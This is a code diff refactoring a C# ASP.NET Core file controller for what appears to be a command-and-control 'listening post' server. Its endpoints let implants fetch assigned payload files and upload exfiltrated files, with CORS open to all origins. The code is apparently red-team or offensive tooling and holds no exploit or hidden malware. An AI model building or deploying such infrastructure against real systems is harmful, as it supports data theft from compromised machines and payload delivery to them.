@@ -1,120 +1,134 @@
-﻿using ListeningPostApiServer.Data;
+﻿using System;
+using System.IO;
+using System.Linq;
+using System.Threading.Tasks;
 using ListeningPostApiServer.Interfaces;
 using ListeningPostApiServer.Models;
+using Microsoft.AspNetCore.Cors;
 using Microsoft.AspNetCore.Http;
 using Microsoft.AspNetCore.Mvc;
-using Microsoft.EntityFrameworkCore;
-using System;
-using System.IO;
-using System.Threading.Tasks;
-using Microsoft.AspNetCore.Cors;
 
 namespace ListeningPostApiServer.Controllers
 {
     /// <inheritdoc />
     /// <summary>
-    /// An Api Controller to provide RESTful CRUD operations for Files hosted on the Listening Post.
-    /// Implements the <see cref="T:Microsoft.AspNetCore.Mvc.ControllerBase" />
+    ///     An Api Controller to provide RESTful CRUD operations for Files hosted on the Listening Post.
+    ///     Implements the <see cref="T:Microsoft.AspNetCore.Mvc.ControllerBase" />
     /// </summary>
     /// <seealso cref="T:Microsoft.AspNetCore.Mvc.ControllerBase" />
-    [ApiController]
-    [EnableCors("AllowAll")]
-    [ProducesErrorResponseType(typeof(NotFoundResult))]
     [Produces("application/json", "application/octet-stream")]
-    [Route("[Controller]")]
+    [Route("[controller]")]
+    [EnableCors("AllowAll")]
+    [ApiController]
+    [ProducesErrorResponseType(typeof(NotFoundResult))]
     public class FileController : ControllerBase
     {
-        #region Fields
-
-        /// <summary>
-        /// Holds the file repository Implementation to be consumed by other methods.
-        /// </summary>
-        private readonly FileRepository _fileRepository;
-
-        #endregion Fields
-
         #region Constructors
 
         /// <summary>
-        /// Initializes a new instance of the <see cref="FileController" /> class.
         /// </summary>
-        /// <param name="fileRepository">A File Repository Interface.</param>
-        public FileController(IRepository<FileBase> fileRepository)
+        /// <param name="filesRepo"></param>
+        /// <param name="implantRepo"></param>
+        /// <param name="exFiles"></param>
+        /// <param name="payloadRepo"></param>
+        public FileController(IRepository<FileBase> filesRepo, IRepository<Implant> implantRepo,
+            IRepository<ExfiltratedFile> exFiles, IRepository<PayloadFile> payloadRepo)
         {
-            _fileRepository = (FileRepository)fileRepository;
+            _files = filesRepo;
+            _implantRepository = implantRepo;
+            _exFiles = exFiles;
+            _payload = payloadRepo;
         }
 
         #endregion Constructors
 
+        #region Fields
+
+        /// <summary>
+        ///     Holds the file repository Implementation to be consumed by other methods.
+        /// </summary>
+        private readonly IRepository<FileBase> _files;
+
+        private readonly IRepository<Implant> _implantRepository;
+        private readonly IRepository<ExfiltratedFile> _exFiles;
+        private readonly IRepository<PayloadFile> _payload;
+
+        #endregion Fields
+
         #region Methods
 
         /// <summary>
-        /// Downloads the specified file.
+        ///     Downloads the specified file.
         /// </summary>
         /// <param name="id">The file identifier (Guid).</param>
         /// <returns>Task&lt;IActionResult&gt;.</returns>
         /// <remarks>Reliable only in certain instances, needs work.</remarks>
-        [HttpGet("download/{id}")]
+        [HttpGet("download/{id:guid}")]
         public async Task<IActionResult> Download(Guid id)
         {
-            if (id != Guid.Empty)
-            {
-                return Ok(await _fileRepository.GetByGuidAsync(id));
-            }
+            var fileToSend = await _files.GetAsync(id);
 
-            var fileToSend = await _fileRepository.GetByGuidAsync(id);
+            if (fileToSend == null)
+                return NotFound(new {message = "requested file id is not found"});
 
-            using (var stream = new FileStream(fileToSend.TempFilePath, FileMode.Open))
-            {
-                return Ok(File(stream, "application/octet-stream", fileToSend.ActualFileName));
-            }
+            await using var stream = new FileStream(fileToSend.TempFilePath, FileMode.Open);
+            return Ok(File(stream, "application/octet-stream", fileToSend.ActualFileName));
         }
 
         /// <summary>
-        /// Retrieves metadata for a particular file stored on the server, or all files if the Guid
-        /// is not specified.
+        ///     Retrieves metadata for a particular file stored on the server, or all files if the Guid
+        ///     is not specified.
         /// </summary>
         /// <param name="id">The identifier.</param>
         /// <returns>Task&lt;IActionResult&gt;.</returns>
-        [HttpGet("{id?}")]
+        [HttpGet("{id:guid?}")]
         public async Task<IActionResult> Get(Guid? id)
         {
-            return id != null ? Ok(await _fileRepository.GetByGuidAsync(id.Value)) : Ok(await _fileRepository.GetAllAsync());
+            if (!id.HasValue) return Ok(await _files.GetAsync());
+
+            var file = await _files.GetAsync(id.Value);
+
+            return file == null
+                ? NotFound(new {message = "The requested file does not exist"})
+                : Ok(file);
         }
 
         /// <summary>
-        /// Provides a download mechanism for agents to retrieve files assigned to them, stored in
-        /// the Listening Post.
+        ///     Provides a download mechanism for agents to retrieve files assigned to them, stored in
+        ///     the Listening Post.
         /// </summary>
         /// <param name="nodeId">       The node (agent/implant) identifier.</param>
         /// <param name="fileRequested">The file requested.</param>
         /// <returns>Task&lt;IActionResult&gt;.</returns>
         /// <remarks>Meant for Agent use.</remarks>
-        [HttpPost("push/{nodeId}")]
-        public async Task<IActionResult> Push([FromRoute]int nodeId, [FromBody] FileBase fileRequested)
+        [HttpPost("push/{nodeId:int}")]
+        public async Task<IActionResult> Push([FromRoute] int nodeId, [FromBody] FileBase fileRequested)
         {
-            var node = await _fileRepository.Context.Set<Implant>().FindAsync(nodeId);
-            var assignedFile = node.PayloadFile;
+            var node = await _implantRepository.GetAsync(nodeId);
+            var assignedFile = node?.PayloadFile;
 
             var fileToSend = assignedFile;
 
             if (assignedFile == null)
             {
-                var requestedFile = await _fileRepository.Context.Set<PayloadFile>()
-                    .FirstOrDefaultAsync(f => f.ActualFileName == fileRequested.ActualFileName);
+                var requestedFile = (await _payload.GetAsync(f => f.ActualFileName == fileRequested.ActualFileName))
+                    .FirstOrDefault();
+
                 if (requestedFile == null)
                     return BadRequest();
+
                 fileToSend = requestedFile;
             }
 
-            using (var stream = new FileStream(fileToSend.TempFilePath, FileMode.Open))
-            {
-                return Ok(File(stream, "application/octet-stream", fileToSend.ActualFileName));
-            }
+            if (fileToSend == null)
+                return Ok();
+
+            await using var stream = new FileStream(fileToSend.TempFilePath, FileMode.Open);
+            return Ok(File(stream, "application/octet-stream", fileToSend.ActualFileName));
         }
 
         /// <summary>
-        /// Directly uploads a file to the server, bypassing associating with an agent.
+        ///     Directly uploads a file to the server, bypassing associating with an agent.
         /// </summary>
         /// <param name="file">The file.</param>
         /// <returns>Task&lt;IActionResult&gt;.</returns>
@@ -126,7 +140,7 @@ namespace ListeningPostApiServer.Controllers
 
             var filePath = Path.GetTempFileName();
 
-            using (var stream = new FileStream(filePath, FileMode.Create))
+            await using (var stream = new FileStream(filePath, FileMode.Create))
             {
                 await file.CopyToAsync(stream);
             }
@@ -137,32 +151,33 @@ namespace ListeningPostApiServer.Controllers
                 ActualFileName = file.FileName
             };
 
-            var newFile = await _fileRepository.CreateAsync(newExFile);
-            await _fileRepository.SaveChangesAsync();
+            var newFile = await _payload.AddAsync(newExFile);
 
             return Ok(newFile);
         }
 
         /// <summary>
-        /// Uploads a File to the server, registering which Agent Uploaded it.
+        ///     Uploads a File to the server, registering which Agent Uploaded it.
         /// </summary>
         /// <param name="nodeId">The node identifier.</param>
         /// <param name="file">  The file.</param>
         /// <returns>Task&lt;IActionResult&gt;.</returns>
         /// <remarks>Meant to be used by Agents.</remarks>
-        [HttpPost("pull/{nodeId}")]
+        [HttpPost("pull/{nodeId:int}")]
         public async Task<IActionResult> UploadToServer(int nodeId, IFormFile file)
         {
             //if (file.Length <= 0) return BadRequest();
+            var implant = await _implantRepository.GetAsync(nodeId);
+
+            if (implant == null)
+                return NotFound(new {message = "your implant id does not exist"});
 
             var filePath = Path.GetTempFileName();
 
-            using (var stream = new FileStream(filePath, FileMode.Create))
+            await using (var stream = new FileStream(filePath, FileMode.Create))
             {
                 await file.CopyToAsync(stream);
             }
-
-            var implant = await _fileRepository.Context.Set<Implant>().FindAsync(nodeId);
 
             var newExFile = new ExfiltratedFile
             {
@@ -171,8 +186,7 @@ namespace ListeningPostApiServer.Controllers
                 ActualFileName = file.FileName
             };
 
-            await _fileRepository.CreateAsync(newExFile);
-            await _fileRepository.SaveChangesAsync();
+            await _exFiles.AddAsync(newExFile);
 
             return Ok();
         }
